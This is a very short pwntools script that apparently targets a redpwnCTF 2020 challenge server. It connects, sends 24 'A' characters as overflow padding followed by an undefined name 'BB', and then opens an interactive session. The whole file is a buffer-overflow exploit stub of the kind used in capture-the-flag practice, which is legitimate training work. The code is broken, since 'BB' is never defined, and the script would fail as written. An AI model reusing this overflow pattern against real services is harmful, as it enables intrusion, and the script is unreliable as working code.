from pwn import *

r = remote("2020.redpwnc.tf", 31199)

payload = "A"*24
payload += BB

r.sendline(payload)
r.interactive()
